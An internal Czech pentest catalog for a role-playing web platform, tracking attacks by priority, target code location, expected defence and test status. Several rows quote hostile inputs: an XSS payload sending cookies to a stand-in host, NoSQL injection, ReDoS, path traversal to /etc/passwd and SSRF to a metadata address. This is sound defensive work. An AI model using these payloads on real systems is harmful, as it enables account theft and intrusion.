# Attack katalog (skill `pentest`) — kompletní útočná matice

> Zdroj: workflow pentest-full-catalog (5 skupin optik + syntéza, 2026-07-11, ~550k tokenů), ověřeno
> čtením kódu. Živý dokument — při změně kódu re-verifikovat. `pentest/SKILL.md` odkazuje sem.
>
> **Stav:** 🟢 pin = díra zavřená, zelený test hlídá regresi (`(napsat)` = obrana existuje, test ne) ·
> 🔴 it.failing = neopravená díra, červený dokumentační test (zezelená po fixu) · 📋 TODO = čeká na
> design/rozhodnutí · ⚪ = benigní/N-A.
> **Priorita:** P0 kritické živé (auth/egress/money/XSS) · P1 kritické třídy s obranou (zamknout pinem)
> · P2 herní integrita · P3 soukromí/GDPR · P4 abuse/DoS · P5 enumerace/nízké.

| P | PT-ID | Útok | Cíl (soubor:řádek) | Očekávaná obrana | Styl | T | Stav |
|---|---|---|---|---|---|---|---|
| P0 | PT-36a | Stored XSS: `pages` `table.title:"<img src=x onerror=fetch('//evil/?c='+document.cookie)>"` → střelí u KAŽDÉHO diváka vč. PJ/Admin = krádež cookie/účtu | `PATCH /worlds/:id/pages`; sink `PageSidebar.tsx:98`; `sanitizeTable` `pages.service.ts:54` NEsanitizuje `title` | `sanitizeTable` i na `title` | 36 | T1 | 🔴 it.failing |
| P0 | PT-35a | 2FA brute: znám heslo, `code:"000000".."999999"`; challenge se jen `peek` (nespotřebuje), 0 čítač, jen IP throttle → rotace IP | `POST /auth/login/totp` `auth.service.ts:262-320`, `totp.service.ts:120` | Lockout challenge+účtu po N | 35 | T1 | 🔴 it.failing |
| P0 | PT-35e | Stale role: demotovaný Admin (JWT `role:Admin`) čte cizí private svět; `OptionalJwtAuthGuard` NEobnovuje roli z DB → bypass do expirace (3 dny) | `GET /worlds/:id`; `optional-jwt-auth.guard.ts:22-32` vs `jwt-auth.guard.ts:69` | Optional guard bere roli z DB | 35 | T1 | 🔴 it.failing |
| P0 | PT-39b | Freemium cap TOCTOU: paralelně N× `join` → každý čte `countActiveWorldsForUser` PŘED zápisem → všechny projdou | `POST /worlds/:id/join` `worlds.service.ts:816` | Atomický cap (unique/tx) | 39 | T1 | 🔴 it.failing |
| P0 | PT-39a | Ne-podporovatel uloží prémiový `chatSkin` (gate jen na `diceSkinMapping`) | `PATCH .../chat/appearance` `chat.service.ts:2397`, gate `:2429` | `isEffectiveSupporter` i na `chatSkin` | 39 | T1 | 🔴 it.failing |
| P0 | PT-43c | Tvorba peněz: A→B transfer 100 (A −100), pak A `/undo` popne debet → A zpět 100, B drží 100 = 100 z ničeho | `POST .../accounts/:id/transfer`+`/undo`; `undoLastOnce` `character-accounts.service.ts:480` | Transfer/purchase debet undo-locked | 43 | T1 | 🔴 it.failing |
| P0 | PT-43b | Věc zdarma: koupím za 100, `/undo` popne debet → balance +100, položka zůstává | `POST .../accounts/:id/undo` `character-accounts.service.ts:480` | Undo nesmí popnout purchase-tx (nebo PJ-only) | 43 | T1 | 🔴 it.failing |
| P0 | PT-43d | Obejití self-adjust gate: `allowPlayerSelfAdjust:false` blokuje `adjust`, hráč mění balance přes `/undo` (flag nekontroluje) | `POST .../accounts/:id/undo` vs `adjust` gate `:402` | Undo za stejný gate jako adjust | 43 | T1 | 🔴 it.failing |
| P0 | PT-43a | Double-purchase: 2× souběžný `POST` při `balance≥2×cena` → 2 odečty z 1 záměru; DTO bez nonce | `POST /campaign/shopitems/:id/purchase` `campaign-purchase.service.ts:76` | Idempotency-key/nonce dedup | 43 | T1 | 📋 TODO |
| P0 | PT-32b | SSRF: `PlatformDocument.url` → `GET /platform-documents/:id/view` slepě `fetch(rec.url)` bez allowlistu | `platform-documents.service.ts:63` | `isMediaUrl` guard jako world-export | 32 | T1 | 📋 TODO |
| P0 | PT-5a | Forced-logout CSRF: cross-site `POST /auth/logout` (simple request, `credentials:include`), cookie `SameSite=None` | `auth.controller.ts:197`, `auth-cookie.ts:34` | CSRF token / custom-header | 5 | T1 | 🔴 it.failing (nízká záv.) |
| P1 | PT-32a | SSRF world export: `imageUrl=http://169.254.169.254/...` → interní bajty do ZIP | `media-url.guard.ts:22` +25MB cap | origin-allowlist https+cloudinary | 32 | T1 | 🟢 pin (17 case) + 📋 e2e |
| P1 | PT-36b/c/d | `content/text/customData: "<script>…"` do stránky/timeline/novin | `sanitize-rich-text.ts:21`, `timeline.service.ts:97`, `pages.service.ts:70` | strikt allowlist zahodí `<script>`/`on*` | 36 | T1 | 🟢 pin (napsat) |
| P1 | PT-22a | NoSQL op injection: login `{"identifier":{"$gt":""},"password":{"$gt":""}}` | `login.dto.ts:9` `@IsString`+ValidationPipe | whitelist+forbidNonWhitelisted → 400 | 22 | T1 | 🟢 pin (napsat) |
| P1 | PT-22b/c | ReDoS: `?q=(a+)+$` do Mongo `$regex` (user/chat/campaign search) | `escape-regex.ts:7`, `users.repository:296`, `chat-message.repository:62` | escape metaznaků → literál | 22 | T1 | 🟢 pin (napsat) |
| P1 | PT-10a | Upload `evil.svg` (`image/svg+xml`, `<script>`) | `upload.service.ts:22,44` whitelist | SVG mimo whitelist → 415 | 10 | T1 | 🟢 pin (napsat) |
| P1 | PT-10b | MIME spoof: JS tělo jako `image/png` | `assertMagicBytes` `upload.service.ts:60-93` | signatura `89 50 4E 47` → 415 | 10 | T1 | 🟢 pin (napsat) |
| P1 | PT-10d | Path traversal `.../static/../../etc/passwd` do delete | `deleteLocalImageByUrl:704` guard `:713` | `startsWith(root+sep)` | 10 | T1 | 🟢 pin (napsat) |
| P1 | PT-10c | Polyglot `.md`/`.txt` s `<script>` (text/* bez magic-check) | `upload.service.ts:87` | Cloudinary raw = neexekuovatelné | 10 | T1/T2 | 📋 TODO (nízká) |
| P1 | PT-43e | Double-refund: 2× souběžné storno téhož nákupu | `markRefundedIfActive:66` | atomický flip, 2. dostane null | 43 | T1 | 🟢 pin (`economy.race` RC-E2) |
| P1 | PT-4a | WS odposlech: `room:join "user:<cizíId>"` | `app.gateway.ts:48-53` | room==`user:{data.userId}` → 403 | 4 | T1 | 🟢 pin (`app.gateway.spec`) |
| P1 | PT-4b | WS leak kanálu: `room:join "chat:<privateId>"` bez membershipu | `app.gateway.ts:37-43`, `chat.service.ts:178` | 403 přes `channel.worldId` | 4/2 | T1 | 🟢 pin |
| P1 | PT-15.8a/b/c | Guest eskalace: REST/WS na Camp/JwtAuthGuard endpoint | `guest-or-member.guard`, `jwt-auth.guard.ts:43`, `global-chat.gateway.ts:350` | 403 `GUEST_HOSPODA_ONLY` / 401 | 15.8 | T1 | 🟢 pin |
| P2 | PT-46a | Forge hodu na mapě: `dice.roll {dicePayload:{faces:[999],total:999}}` uložen verbatim | `map-operations.service.ts:1325`, `dice-ops.dto.ts:20` `@IsObject` | Server hází / validuje total vs faces | 46 | T1 | 🔴 it.failing |
| P2 | PT-46c | Forge hodu v chatu: `{dicePayload:{total:999}}` | `chat.service.ts:1381`, `create-message.dto.ts:112` `@IsObject` | Autoritativní server-side roll | 46 | T1 | 🔴 it.failing |
| P2 | PT-46b | Spoof `rollerKind:'pj'/'npc'` (hráč se vydává za PJ) | `operations-authorizer.service.ts:166` (jen byUserId+tokenId) | `rollerKind` z role+vlastnictví | 46 | T1 | 🔴 it.failing |
| P2 | PT-46d/e | `token.update currentHp:99999` / `-50000` / `"9e9"` — absolutní `$set` bez mezí/typu | `map-operations.service.ts:642`, `token-ops.dto.ts:50` | `@IsInt @Min(0)` + clamp `0…maxHp` | 46 | T1 | 🔴 it.failing |
| P2 | PT-46f | `patch:{initiative:99999}` → vždy první | `operations-authorizer.service.ts:151` (bez bounds) | meze / autorita PJ | 46 | T1 | 📋 TODO |
| P2 | PT-46g | `token.move` mimo tah (`currentTokenId≠token`) | `operations-authorizer.service.ts:83` (jen vlastnictví) | v boji ověřit `currentTokenId` | 46 | T1 | 📋 TODO |
| P2 | PT-14a | Lost update: 2 souběžné `token.update currentHp` (dmg‖heal) → absolutní `$set` přepíše | `map-operations.service.ts:642` (read-modify-write) | `$inc` delta / optimistic version | 14 | T1 | 📋 TODO |
| P2 | PT-11a/b | Replay `dice.roll`/`drawing.add`/`combat.turn` po reconnectu → duplicita/přeskočený tah | `map-operations.service.ts:87-167` (bez nonce) | Idempotency-key jako chat | 11 | T1 | 📋 TODO |
| P3 | PT-40a | Zbytková PII: `push` modul bez `user.deletion.hardDeleted` → `push_subscriptions` drží endpoint po erasure | `account-cleanup.cron.ts:60`, `users.repository.ts:214` | Purge push subs při hard-delete | 40 | T1 | 🔴 it.failing |
| P3 | PT-40b | Zbytková UGC: `chat` modul bez erasure handleru; `chatmessages` drží senderName/content | `chat-message.schema.ts:11-18` | Redakce/purge world-chat zpráv | 40 | T1 | 📋 TODO |
| P4 | PT-26c | WS `typing:start` bez `requireAuth` i rate-limitu, broadcast do roomu; 10k emitů/s | `chat.gateway.ts:151-176` | `requireAuth` + WS throttle | 26 | T1 | 🔴 it.failing |
| P4 | PT-34c | Report-bombing: 100/min na 1 cíl bez dedup → report+message+e-mail amplifikace | `moderation.service.ts:114` | Dedup (reporter+target) + throttle | 34 | T1 | 🔴 it.failing + 📋 |
| P4 | PT-34a/b/d/e | Flood: chat zprávy (bez `@Throttle`), `@all` fan-out, world/entity churn (bez count cap) | `chat.controller.ts:294`, `chat.service.ts:1342`, `characters.controller.ts:133` | Per-user throttle + entity cap | 34 | T1 | 📋 TODO |
| P4 | PT-26d/e | `map:ping`/`map:ruler`/`sound:play` flood → N-klient amplifikace, bez throttle | `maps.gateway.ts:211,233`, `chat.gateway.ts:202` | Per-socket event rate-limit | 26 | T1/T2 | 📋 TODO |
| P4 | PT-26a/b | 5MB WS frame opakovaně; connection flood bez per-IP cap | `socket-io.adapter.ts:72,84` | Menší buffer + per-IP cap | 26 | T2 | 📋 TODO |
| P4 | PT-25a/b | Anon `GET /worlds` / `/pages` bez paginace/projekce → plná data | `worlds.controller.ts:52`, `pages.service.ts:200` | Paginace + projekce | 25 | T1 | 📋 TODO |
| P4 | PT-33a | Pomalý čtenář + pumpa `map:ping` → write-buffer per socket roste bez cap | `socket-io.adapter.ts` | Cap write-bufferu / drop-slow | 33 | T2 | 📋 TODO |
| P5 | PT-35b/c/d | Account enumeration: `/auth/check-email {available}`, login timing (bcrypt early-throw), `EMAIL_TAKEN` vs `USERNAME_TAKEN` | `auth.controller.ts:161`, `auth.service.ts:195,125` | auth-only/generická + dummy bcrypt | 35 | T1/T2 | 📋 TODO |
| P5 | PT-2a | Cross-world odběr: `room:join "world:<cizíId>"` — prefix `world:` NEgated (jen leak-safe signály) | `app.gateway.ts:54` | Membership gate i na `world:{id}` | 2 | T1 | 📋 TODO (accepted N-8) |

## Pokrytí a mezery

**Pokryto (≥1 útok):** styly 2, 4, 5, 10, 11, 14, 15.8, 22, 25, 26, 32, 33, 34, 35, 36, 39, 40, 43, 46 — **19 stylů**.

**Opodstatněně bez útoku (prokázaná nedosažitelnost, NE mezera):**
- **18 (secret exposure):** `getPublicKey` vrací jen VAPID public, push endpoint je capability-URL scoped na vlastní userId, z logů škrtnut (FIX-49). Žádný sekret dosažitelný.
- **12/13 (cross-user leak):** `listPurchases` filtruje na `characterId`, účty gatuje `isStaffOrOwner`. Jediná „cascade" slabina = orphan = varianta erasure (PT-40a/b).

**SKUTEČNÉ MEZERY katalogu (bezpečnostně relevantní, doplnit) — priorita psaní:**
1. **REST IDOR na ostrá data napříč světy/uživateli** (bestie · mapy · character subdoc/sheet · pages access-filtr). Máme jen WS/room IDOR (PT-2a/4a/4b) a self-scope gate, NE plošný `GET/PATCH /worlds/:A/<entita>/:idZ_B → 403`. **Největší chybějící třída.**
2. **Hlubší auth flows:** password-reset token (reuse/expiry/leak), e-mail verification bypass, refresh-token rotation replay / reuse-detection, JWT alg/kid confusion, 2FA recovery-code.
3. **CORS allow-origin reflection s credentials** — aktivní test chybí.
4. **Cross-instance / multi-replica (styl 41):** in-memory throttler/session/cache při 2+ replikách = dokumentovaný dluh, bez útoku.
5. **Dependency/CVE (styl 21) + supply-chain** — mimo T1, patří do T2 (nuclei/npm audit).
6. **Plošný authz-matrix sweep (role × world-scoped endpoint)** — máme bodové gate testy, ne systematický průchod (částečně kryje `+authz-runtime` v plny-audit).

## Je pentest stejně komplexní jako plny-audit (po bezpečnostní stránce)?

**Ne — a nemá být.** Pentest je **úzká, ale hlubší proof-vrstva** nad *podmnožinou* bezpečnostních
stylů (19). Tam, kde střílí, jde hlouběji než audit (reálný exploit + permanentní pin, který zčervená
při návratu díry — statika to neumí). Ale `plny-audit` pokrývá všech 46 stylů napříč BE+FE do L1-L3 +
proof-vrstvy, včetně tříd, které pentest nemá (REST IDOR na data, hlubší auth flows, dep CVE, a11y,
výkon/SLO, render-regrese, version-skew). Pentest je navíc **závislý na statické mapě auditu** — audit
říká KAM střílet. Je to „teeth", ne „mapa". Odpovídá tedy `+pentest` proof-vrstvě *uvnitř* plny-audit,
ne celému auditu. Dokud se nedoplní mezery 1-2 výše (REST IDOR + auth flows), není pentest po
bezpečnostní stránce úplný.
